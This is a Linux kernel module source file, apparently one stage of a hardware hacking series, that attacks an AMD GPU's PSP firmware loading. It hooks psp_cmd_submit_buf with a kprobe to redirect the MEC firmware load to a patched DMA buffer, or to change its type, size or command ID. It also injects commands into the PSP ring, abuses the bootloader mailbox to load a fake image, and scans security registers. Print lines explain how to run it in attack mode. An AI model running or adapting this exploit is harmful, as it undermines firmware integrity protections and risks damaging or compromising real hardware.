/*
 * patch_mec_fw32.c — Phase 32: TOCTOU Attack on MEC Firmware Load
 *
 * Phase 31 confirmed:
 *   - Kprobe intercepts MEC1 LOAD_IP_FW (fw_type=0x31) during GPU reset
 *   - PSP cmd buffer at kernel addr accessible in pre-handler
 *   - MEC1 firmware loaded from GPU VRAM 0x97:FFAA1000, size=0xF8
 *   - C2PMSG mailbox IS writable (C2PMSG_69 accepted our DBGDRV value)
 *   - Ring injection needs doorbell (RPTR didn't advance)
 *
 * Attack strategies:
 *   A. TOCTOU: In kprobe pre-handler, modify PSP cmd buffer to redirect
 *      MEC1 firmware load to our DMA buffer containing patched firmware
 *   B. PROG_REG: Submit PSP cmd_id=11 (PROG_REG) through driver's own
 *      command submission to write SRAM registers via PSP
 *   C. NOP-the-load: Change fw_type in cmd buffer so PSP skips MEC1,
 *      then try SRAM write while MEC has old/no firmware loaded
 *   D. Doorbell: Find PSP ring doorbell to make ring injection work
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/kprobes.h>
#include <linux/dma-mapping.h>
#include <linux/slab.h>
#include <linux/firmware.h>

MODULE_LICENSE("GPL");

#define AMD_VENDOR_ID 0x1002
#define AMD_DEV_ID    0x1586

static void __iomem *mmio;
static struct pci_dev *g_pdev;

static u32 rr(u32 dw_off) { return readl(mmio + (u64)dw_off * 4); }
static void wr(u32 dw_off, u32 val) {
	writel(val, mmio + (u64)dw_off * 4);
	readl(mmio + (u64)dw_off * 4);
}

/* Registers */
#define regCP_MEC1_INSTR_PNTR    0x021A8
#define regCP_MEC_CNTL           0x0A802
#define regCP_MEC_ME1_UCODE_ADDR 0x0A814
#define regCP_MEC_ME1_UCODE_DATA 0x0A815

/* MP0 C2PMSG */
#define C2PMSG_33   0x16061
#define C2PMSG_35   0x16063
#define C2PMSG_36   0x16064
#define C2PMSG_69   0x16085
#define C2PMSG_81   0x16091

/* PSP ring */
#define PSP_RING_RPTR  0x16083
#define PSP_RING_WPTR  0x16084

/* PSP command IDs */
#define GFX_CMD_ID_LOAD_IP_FW  6
#define GFX_CMD_ID_PROG_REG   11
#define GFX_CMD_ID_LOAD_TOC   13
#define GFX_CMD_ID_BOOT_CFG   15

/* MEC firmware type */
#define GFX_FW_TYPE_CP_MEC_ME1 0x31

/* Attack mode selection */
static int attack_mode = 0;
module_param(attack_mode, int, 0444);
MODULE_PARM_DESC(attack_mode,
	"0=observe, 1=redirect_addr, 2=nop_load, 3=prog_reg, 4=zero_size");

/* DMA buffer for fake firmware */
static void *fake_fw_buf;
static dma_addr_t fake_fw_dma;
#define FAKE_FW_SIZE  (256 * 1024)  /* 256KB, larger than MEC firmware */

/* Counters */
static int cmd_count = 0;
static int mec_intercept_count = 0;
static int attack_attempted = 0;
static u32 original_addr_lo = 0;
static u32 original_addr_hi = 0;
static u32 original_size = 0;
static u32 original_type = 0;

/*
 * Build a minimal valid MEC firmware image in our DMA buffer.
 * Copy the real firmware header (with valid signature) but patch
 * the instruction body to be all NOPs, then a busy-wait loop.
 */
static int prepare_fake_firmware(void)
{
	const struct firmware *real_fw;
	int ret;
	u32 *code;
	int i;

	/* Try to load the real MEC firmware to copy its header */
	ret = request_firmware(&real_fw, "amdgpu/gc_11_5_1_mec.bin", &g_pdev->dev);
	if (ret) {
		pr_info("fw32: Could not load real firmware: %d\n", ret);
		pr_info("fw32: Building headerless fake firmware\n");

		/* Fill with NOP instructions (RS64 NOP = 0xBF800000) */
		code = (u32 *)fake_fw_buf;
		for (i = 0; i < FAKE_FW_SIZE / 4; i++)
			code[i] = 0xBF800000;  /* s_nop 0 */

		/* Put a simple loop at address 0: s_branch -1 (loop forever) */
		code[0] = 0xBF820000;  /* s_branch 0 (branch to self) */
		return 0;
	}

	pr_info("fw32: Real firmware loaded: %zu bytes\n", real_fw->size);

	/* Copy entire real firmware (with valid headers + signature) */
	if (real_fw->size <= FAKE_FW_SIZE) {
		memcpy(fake_fw_buf, real_fw->data, real_fw->size);
		pr_info("fw32: Copied %zu bytes of real firmware\n", real_fw->size);

		/* Now patch the code section (starts at offset 0x200 for RS64) */
		code = (u32 *)(fake_fw_buf + 0x200);
		/* Patch first 16 instructions to NOPs */
		for (i = 0; i < 16; i++)
			code[i] = 0xBF800000;  /* s_nop 0 */
		/* Put loop at instruction 0 */
		code[0] = 0xBF820000;  /* s_branch 0 */

		pr_info("fw32: Patched code section at offset 0x200\n");
		pr_info("fw32: Original code[0]=0x%08X, now=0x%08X\n",
			*(u32 *)(real_fw->data + 0x200), code[0]);
	} else {
		pr_info("fw32: Firmware too large (%zu > %d)\n",
			real_fw->size, FAKE_FW_SIZE);
		memcpy(fake_fw_buf, real_fw->data, FAKE_FW_SIZE);
	}

	release_firmware(real_fw);
	return 0;
}

/*
 * Kprobe pre-handler: intercept psp_cmd_submit_buf
 *
 * Function signature:
 *   int psp_cmd_submit_buf(struct psp_context *psp,
 *                          struct amdgpu_firmware_info *ucode,
 *                          struct psp_gfx_cmd_resp *cmd, uint64_t fence_mc_addr)
 *
 * rdx = cmd pointer (struct psp_gfx_cmd_resp *)
 */
static int cmd_intercept_pre(struct kprobe *p, struct pt_regs *regs)
{
	u32 *cmd = (u32 *)regs->dx;  /* cmd buffer in rdx */
	u32 cmd_id, fw_type, fw_addr_lo, fw_addr_hi, fw_size;

	if (!cmd)
		return 0;

	cmd_count++;
	cmd_id = cmd[2];

	if (cmd_id != GFX_CMD_ID_LOAD_IP_FW)
		return 0;

	fw_addr_lo = cmd[7];
	fw_addr_hi = cmd[8];
	fw_size = cmd[9];
	fw_type = cmd[10];

	pr_info("fw32: >>> LOAD_IP_FW #%d: type=0x%04X addr=%08X:%08X size=0x%X\n",
		cmd_count, fw_type, fw_addr_hi, fw_addr_lo, fw_size);

	if (fw_type != GFX_FW_TYPE_CP_MEC_ME1)
		return 0;

	mec_intercept_count++;
	pr_info("fw32: *** MEC1 INTERCEPTED (attempt #%d) ***\n",
		mec_intercept_count);

	/* Save originals */
	original_addr_lo = fw_addr_lo;
	original_addr_hi = fw_addr_hi;
	original_size = fw_size;
	original_type = fw_type;

	pr_info("fw32: Original: addr=%08X:%08X size=0x%X type=0x%X\n",
		original_addr_hi, original_addr_lo, original_size, original_type);

	switch (attack_mode) {
	case 0:
		/* Observe only — dump full command */
		pr_info("fw32: MODE 0: Observation only\n");
		{
			int i;
			for (i = 0; i < 24; i += 4) {
				pr_info("fw32:   [%02d] %08X %08X %08X %08X\n",
					i, cmd[i], cmd[i+1], cmd[i+2], cmd[i+3]);
			}
		}
		break;

	case 1:
		/* TOCTOU: Redirect firmware address to our DMA buffer */
		pr_info("fw32: MODE 1: TOCTOU — redirecting firmware address!\n");
		pr_info("fw32:   fake_fw DMA = 0x%llX\n", (u64)fake_fw_dma);
		cmd[7] = (u32)(fake_fw_dma & 0xFFFFFFFF);  /* addr_lo */
		cmd[8] = (u32)(fake_fw_dma >> 32);          /* addr_hi */
		pr_info("fw32:   New addr: %08X:%08X\n", cmd[8], cmd[7]);
		attack_attempted = 1;
		break;

	case 2:
		/* NOP the load: change fw_type to something invalid */
		pr_info("fw32: MODE 2: Changing fw_type to skip MEC1 load\n");
		cmd[10] = 0xFFFF;  /* Invalid type — PSP should reject/skip */
		attack_attempted = 2;
		break;

	case 3:
		/* PROG_REG: Change cmd_id from LOAD_IP_FW to PROG_REG */
		pr_info("fw32: MODE 3: Converting to PROG_REG command\n");
		cmd[2] = GFX_CMD_ID_PROG_REG;  /* Change cmd_id */
		/* PROG_REG format (from amdgpu driver):
		 *   cmd[7] = register offset (SRAM addr register)
		 *   cmd[8] = register value
		 */
		cmd[7] = regCP_MEC_ME1_UCODE_ADDR * 4;  /* Register offset in bytes */
		cmd[8] = 0x0000;  /* Address 0 in SRAM */
		/* Clear other fields */
		cmd[9] = 0;
		cmd[10] = 0;
		cmd[11] = 0;
		attack_attempted = 3;
		break;

	case 4:
		/* Zero size: keep valid header but set size=0 */
		pr_info("fw32: MODE 4: Setting firmware size to 0\n");
		cmd[9] = 0;  /* size = 0 */
		attack_attempted = 4;
		break;
	}

	return 0;
}

/*
 * Post-handler: check results after PSP processed the command
 */
static void cmd_intercept_post(struct kprobe *p, struct pt_regs *regs,
				unsigned long flags)
{
	u32 pc, mec_cntl;
	int i;

	if (!attack_attempted)
		return;

	/* Small delay for PSP to process */
	udelay(100);

	pc = rr(regCP_MEC1_INSTR_PNTR);
	mec_cntl = rr(regCP_MEC_CNTL);

	pr_info("fw32: POST-ATTACK: MEC_CNTL=0x%08X PC=0x%04X attack=%d\n",
		mec_cntl, pc, attack_attempted);

	/* Try SRAM read */
	wr(regCP_MEC_ME1_UCODE_ADDR, 0);
	udelay(10);
	pr_info("fw32: POST-ATTACK: SRAM[0]=0x%08X\n",
		rr(regCP_MEC_ME1_UCODE_DATA));

	/* Read first 4 SRAM words */
	for (i = 0; i < 4; i++) {
		wr(regCP_MEC_ME1_UCODE_ADDR, i);
		udelay(5);
		pr_info("fw32:   SRAM[%d]=0x%08X\n", i, rr(regCP_MEC_ME1_UCODE_DATA));
	}

	attack_attempted = 0;
}

static struct kprobe kp_cmd = {
	.symbol_name = "psp_cmd_submit_buf",
};

/*
 * Strategy D: Find and use the PSP doorbell
 * PSP ring needs a doorbell write to notify PSP of new commands.
 * In amdgpu, this is done via psp_ring_set_wptr which writes to
 * a doorbell register. Let's find it.
 */
static void try_doorbell_ring(void)
{
	u32 rptr, wptr;
	u32 *ring;
	u32 cmd_buf[16] = {0};
	phys_addr_t ring_phys = 0x116F9F000ULL;
	struct page *pg;
	int i;

	rptr = rr(PSP_RING_RPTR);
	wptr = rr(PSP_RING_WPTR);
	pr_info("fw32: Ring: RPTR=0x%04X WPTR=0x%04X\n", rptr, wptr);

	/* Map ring via page */
	pg = pfn_to_page(ring_phys >> PAGE_SHIFT);
	if (!pg) {
		pr_info("fw32: Cannot get page for ring\n");
		return;
	}
	ring = (u32 *)page_address(pg);
	if (!ring) {
		pr_info("fw32: Cannot get page_address for ring\n");
		return;
	}

	/* Offset into page */
	ring = (u32 *)((u8 *)ring + (ring_phys & ~PAGE_MASK));

	pr_info("fw32: Ring mapped at %p\n", ring);

	/* Build BOOT_CFG query command */
	cmd_buf[0] = GFX_CMD_ID_BOOT_CFG;  /* cmd_id */
	cmd_buf[1] = 0;                      /* sub_cmd = query */
	/* rest zeros */

	/* Write command at WPTR position */
	{
		u32 wptr_off = wptr / 4;  /* Convert byte offset to dword */
		for (i = 0; i < 16; i++)
			ring[wptr_off + i] = cmd_buf[i];
		wmb();
	}

	/* Update WPTR */
	wptr += 64;  /* 16 dwords = 64 bytes */

	/* Try multiple doorbell mechanisms */

	/* Method 1: Write WPTR register directly */
	pr_info("fw32: Writing WPTR=0x%04X via MMIO\n", wptr);
	wr(PSP_RING_WPTR, wptr);
	mdelay(50);

	pr_info("fw32: After MMIO WPTR: RPTR=0x%04X WPTR=0x%04X\n",
		rr(PSP_RING_RPTR), rr(PSP_RING_WPTR));

	/* Method 2: Write MP0 interrupt/doorbell registers */
	/* psp_v13_0_ring_set_wptr writes:
	 *   RREG32_SOC15(MP0, 0, regMP0_SMN_C2PMSG_67) -- read
	 *   then WREG32_SOC15(MP0, 0, regMP0_SMN_C2PMSG_67, wptr)
	 *   C2PMSG_67 is at offset 0x16083... wait, that IS the WPTR register
	 *
	 * Actually looking at psp_v13_0_ring_set_wptr:
	 *   It writes to regMP0_SMN_C2PMSG_67 which maps to the WPTR.
	 *   But the actual doorbell might be different.
	 *
	 * In psp_v13_0_4, ring_set_wptr is likely similar.
	 * The key is that writing WPTR should trigger PSP to check.
	 *
	 * But we already wrote WPTR and it didn't work in v31.
	 * Let's try writing to additional trigger registers.
	 */

	/* Try C2PMSG_33 as interrupt trigger */
	pr_info("fw32: Trying C2PMSG_33 interrupt trigger\n");
	wr(C2PMSG_33, 0x80000000);
	mdelay(50);
	pr_info("fw32: After C2PMSG_33: RPTR=0x%04X\n", rr(PSP_RING_RPTR));

	/* Try SMN doorbell: MP0 typically at SMN 0x03B10000 */
	/* The PSP might use a different doorbell mechanism on v13.0.4 */

	/* Check if any MP0 registers changed */
	pr_info("fw32: Post-doorbell state:\n");
	pr_info("fw32:   C2PMSG_33=0x%08X\n", rr(C2PMSG_33));
	pr_info("fw32:   C2PMSG_35=0x%08X\n", rr(C2PMSG_35));
	pr_info("fw32:   C2PMSG_36=0x%08X\n", rr(C2PMSG_36));
}

/*
 * Strategy E: Try submitting PROG_REG through bootloader mailbox
 * Instead of ring, use the C2PMSG bootloader protocol to ask PSP
 * to program a register for us.
 */
static void try_mailbox_prog_reg(void)
{
	u32 resp;

	pr_info("fw32: === MAILBOX PROG_REG ATTEMPT ===\n");

	/* Check bootloader ready */
	resp = rr(C2PMSG_35);
	pr_info("fw32: C2PMSG_35 = 0x%08X (bit31=%d = %s)\n",
		resp, (resp >> 31) & 1,
		(resp & 0x80000000) ? "READY" : "NOT READY");

	if (!(resp & 0x80000000)) {
		pr_info("fw32: Bootloader not ready, skipping\n");
		return;
	}

	/* The bootloader protocol is for firmware LOADING, not register programming.
	 * But let's see if we can abuse it:
	 *
	 * Standard bootloader commands:
	 *   0x10000 = SYSDRV
	 *   0x80000 = DBGDRV
	 *   0xB0000 = SOCDRV
	 *   0x120000 = SPL
	 *
	 * What if we send an address that points to a "fake firmware"
	 * that's actually PROG_REG instructions for PSP?
	 */

	/* First: try sending our DMA buffer as DBGDRV */
	pr_info("fw32: Sending fake firmware as DBGDRV...\n");
	pr_info("fw32:   DMA addr = 0x%llX, shifted = 0x%llX\n",
		(u64)fake_fw_dma, (u64)fake_fw_dma >> 20);

	/* Step 1: Clear response */
	wr(C2PMSG_36, 0);
	udelay(10);

	/* Step 2: Write address >> 20 to C2PMSG_35 */
	wr(C2PMSG_35, (u32)((u64)fake_fw_dma >> 20));
	udelay(10);

	/* Step 3: Write DBGDRV command to C2PMSG_69 */
	wr(C2PMSG_69, 0x80000);  /* PSP_BL2_LOAD_DBGDRV */
	mdelay(100);

	/* Check response */
	resp = rr(C2PMSG_35);
	pr_info("fw32: After DBGDRV: C2PMSG_35=0x%08X C2PMSG_36=0x%08X\n",
		resp, rr(C2PMSG_36));

	/* Try with SPL command (Security Patch Level) */
	pr_info("fw32: Trying SPL command...\n");
	wr(C2PMSG_36, 0);
	udelay(10);
	wr(C2PMSG_35, (u32)((u64)fake_fw_dma >> 20));
	udelay(10);
	wr(C2PMSG_69, 0x120000);  /* PSP_BL2_LOAD_SPL */
	mdelay(100);

	resp = rr(C2PMSG_35);
	pr_info("fw32: After SPL: C2PMSG_35=0x%08X C2PMSG_36=0x%08X\n",
		resp, rr(C2PMSG_36));

	/* Scan for any error codes in C2PMSG range */
	{
		int i;
		pr_info("fw32: Post-mailbox C2PMSG scan (non-zero only):\n");
		for (i = 0; i < 48; i++) {
			u32 v = rr(0x16060 + i);
			if (v)
				pr_info("fw32:   C2PMSG[%d] (0x%05X) = 0x%08X\n",
					i, 0x16060 + i, v);
		}
	}
}

/*
 * Strategy F: Scan for PSP debug/fuse status registers
 * Look for any indication of debug mode, fuse state, or security level
 */
static void scan_psp_security(void)
{
	u32 val;

	pr_info("fw32: === PSP SECURITY SCAN ===\n");

	/* MP0 security status registers (various PSP generations) */
	/* regMP0_SMN_C2PMSG_91 is sometimes used for security state */
	val = rr(0x1609B);
	pr_info("fw32: C2PMSG_91 (0x1609B) = 0x%08X\n", val);
	pr_info("fw32:   Bits: debug_en=%d fuse_ready=%d sec_level=%d\n",
		(val >> 0) & 1, (val >> 1) & 1, (val >> 8) & 0xFF);

	/* Check various MP0 status ranges */
	{
		int i;
		pr_info("fw32: MP0 extended scan (0x16000-0x16020):\n");
		for (i = 0; i < 0x20; i++) {
			val = rr(0x16000 + i);
			if (val)
				pr_info("fw32:   [0x%05X] = 0x%08X\n",
					0x16000 + i, val);
		}
	}

	/* Look for PSP TMR info */
	pr_info("fw32: TMR registers:\n");
	pr_info("fw32:   TMR_BASE_LO (0x16086) = 0x%08X\n", rr(0x16086));
	pr_info("fw32:   TMR_BASE_HI (0x16087) = 0x%08X\n", rr(0x16087));

	/* Check GPCOM (GPU COM) registers — PSP<->GPU interface */
	pr_info("fw32: GPCOM registers:\n");
	{
		int i;
		for (i = 0; i < 16; i++) {
			val = rr(0x16040 + i);
			if (val)
				pr_info("fw32:   GPCOM[%d] (0x%05X) = 0x%08X\n",
					i, 0x16040 + i, val);
		}
	}
}

static int __init fw32_init(void)
{
	int ret;

	g_pdev = pci_get_device(AMD_VENDOR_ID, AMD_DEV_ID, NULL);
	if (!g_pdev)
		return -ENODEV;

	mmio = pci_iomap(g_pdev, 5, 0);
	if (!mmio) {
		pci_dev_put(g_pdev);
		return -ENODEV;
	}

	pr_info("fw32: ====================================================\n");
	pr_info("fw32: PHASE 32: TOCTOU ATTACK ON MEC FIRMWARE LOAD\n");
	pr_info("fw32: Attack mode: %d\n", attack_mode);
	pr_info("fw32: ====================================================\n");

	/* Allocate DMA buffer for fake firmware */
	fake_fw_buf = dma_alloc_coherent(&g_pdev->dev, FAKE_FW_SIZE,
					  &fake_fw_dma, GFP_KERNEL);
	if (!fake_fw_buf) {
		pr_info("fw32: FAIL: Cannot allocate DMA buffer\n");
		pci_iounmap(g_pdev, mmio);
		pci_dev_put(g_pdev);
		return -ENOMEM;
	}
	pr_info("fw32: DMA buffer: virt=%p dma=0x%llX\n",
		fake_fw_buf, (u64)fake_fw_dma);

	/* Prepare fake firmware */
	prepare_fake_firmware();

	/* Strategy D: Try doorbell ring injection */
	try_doorbell_ring();

	/* Strategy E: Try mailbox PROG_REG */
	try_mailbox_prog_reg();

	/* Strategy F: Security scan */
	scan_psp_security();

	/* Arm kprobe for Strategies A-C */
	kp_cmd.pre_handler = cmd_intercept_pre;
	kp_cmd.post_handler = cmd_intercept_post;
	ret = register_kprobe(&kp_cmd);
	if (ret < 0) {
		pr_info("fw32: FAIL: kprobe registration: %d\n", ret);
	} else {
		pr_info("fw32: Kprobe armed on psp_cmd_submit_buf\n");
	}

	pr_info("fw32: ====================================================\n");
	if (attack_mode == 0) {
		pr_info("fw32: OBSERVE mode. To attack, reload with:\n");
		pr_info("fw32:   sudo rmmod patch_mec_fw32\n");
		pr_info("fw32:   sudo insmod patch_mec_fw32.ko attack_mode=1\n");
		pr_info("fw32: Modes: 1=redirect_addr 2=nop_load 3=prog_reg 4=zero_size\n");
	}
	pr_info("fw32: Trigger: cat /sys/kernel/debug/dri/1/amdgpu_gpu_recover\n");
	pr_info("fw32: ====================================================\n");

	return 0;
}

static void __exit fw32_exit(void)
{
	unregister_kprobe(&kp_cmd);

	if (fake_fw_buf)
		dma_free_coherent(&g_pdev->dev, FAKE_FW_SIZE,
				  fake_fw_buf, fake_fw_dma);

	if (mmio)
		pci_iounmap(g_pdev, mmio);

	pci_dev_put(g_pdev);

	pr_info("fw32: Unloaded. %d cmd intercepts, %d MEC intercepts\n",
		cmd_count, mec_intercept_count);
}

module_init(fw32_init);
module_exit(fw32_exit);
